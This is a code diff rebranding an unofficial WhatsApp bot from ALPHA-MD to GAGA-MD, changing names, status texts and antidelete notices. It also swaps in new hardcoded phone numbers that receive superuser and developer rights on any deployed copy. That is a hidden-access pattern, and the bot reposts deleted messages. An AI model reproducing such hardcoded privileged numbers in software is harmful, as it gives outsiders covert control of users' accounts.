@@ -95,7 +95,7 @@ const {
 let {
   reagir
 } = require(__dirname + "/keizzah/app");
-var session = conf.session.replace(/ALPHA-MD;;;=>/g, "");
+var session = conf.session.replace(/GAGA-MD;;;=>/g, "");
 const prefixe = conf.PREFIXE || [];
 
 require('dotenv').config({
@@ -142,7 +142,7 @@ setTimeout(() => {
       logger: pino({
         level: "silent"
       }),
-      browser: ['ALPHA-MD', "safari", "1.0.0"],
+      browser: ['GAGA-MD', "safari", "1.0.0"],
       printQRInTerminal: true,
       fireInitQueries: false,
       shouldSyncHistoryMessage: true,
@@ -209,7 +209,7 @@ if (conf.AUTOBIO === 'yes') {
     setInterval(() => {
       const date = new Date();
       zk.updateProfileStatus(
-        `${conf.OWNER_NAME} is active 24/7 ${date.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' })} It's a ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi' })}.`
+        `GAGA MD is active 24/7 ${date.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' })} It's a ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi' })}.`
       );
     }, 10 * 1000);
   }
@@ -227,7 +227,7 @@ zk.ev.on("messages.upsert", async (m) => {
   const senderNumber = remoteJid.split('@')[0];
 
   // Default auto-reply message
-  let auto_reply_message = `Hello @${senderNumber}, my owner is unavailable right now. Kindly leave a message.`;
+  let auto_reply_message = `Hello @${senderNumber}, I'm Gaga md, my owner is unavailable right now. Kindly leave a message.`;
 
   // Check if the message exists and is a command to set a new auto-reply message
   if (messageText.startsWith('>') && ms.key.fromMe) {
@@ -258,9 +258,9 @@ zk.ev.on("messages.upsert", async (m) => {
     // Function to format notification message
 function createNotification(deletedMessage) {
   const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
-  let notification = `*😈ALPHA ANTIDELETE👿*\n\n`;
-  notification += `*Time deleted🥀:* ${new Date().toLocaleString()}\n`;
-  notification += `*Deleted by🌷:* @${deletedBy.split('@')[0]}\n\n*Powered by Keithkeizzah*\n\n`;
+  let notification = `*GAGA MD ANTIDELETE*\n\n`;
+  notification += `*Time deleted:* ${new Date().toLocaleString()}\n`;
+  notification += `*Deleted by:* @${deletedBy.split('@')[0]}\n\n> ɢᴇɴᴀʀᴀᴛᴇᴅ ʙʏ ɢᴀɢᴀ ᴍᴅ\n\n`;
   return notification;
 }
 
@@ -373,9 +373,9 @@ zk.ev.on("messages.upsert", async m => {
       // Function to format notification message
 function createNotification(deletedMessage) {
   const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
-  let notification = `*😈ALPHA ANTIDELETE👿*\n\n`;
-  notification += `*Time deleted🥀:* ${new Date().toLocaleString()}\n`;
-  notification += `*Deleted by🌷:* @${deletedBy.split('@')[0]}\n\n*Powered by Keithkeizzah*\n\n`;
+  let notification = `*GAGA ANTIDELETE*\n\n`;
+  notification += `*Time deleted:* ${new Date().toLocaleString()}\n`;
+  notification += `*Deleted by:* @${deletedBy.split('@')[0]}\n\n> ɢᴇɴᴀʀᴀᴛᴇᴅ ʙʏ ɢᴀɢᴀ ᴍᴅ\n\n`;
   return notification;
 }
 
@@ -631,10 +631,10 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
       } = require("./bdd/sudo");
       const nomAuteurMessage = ms.pushName;
       const sudo = await getAllSudoNumbers();
-      const superUserNumbers = [servBot, "254748387615", '254110190196', '254748387615', "254796299159", '254752925938', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const superUserNumbers = [servBot, "254112291443", '254729269118', '254757232472', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const allAllowedNumbers = superUserNumbers.concat(sudo);
       const superUser = allAllowedNumbers.includes(auteurMessage);
-      var dev = ['254110190196', '254748387615', "254796299159", '254752925938'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+      var dev = ['254112291443', '254757232472', "254729269118"].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
       function repondre(mes) {
         zk.sendMessage(origineMessage, {
           text: mes
@@ -642,7 +642,7 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
           quoted: ms
         });
       }
-      console.log("\t [][]...{Alpha-Md}...[][]");
+      console.log("\t [][]...{GAGA-MD}...[][]");
       console.log("=========== New message ===========");
       if (verifGroupe) {
         console.log("message sent from : " + nomGroupe);
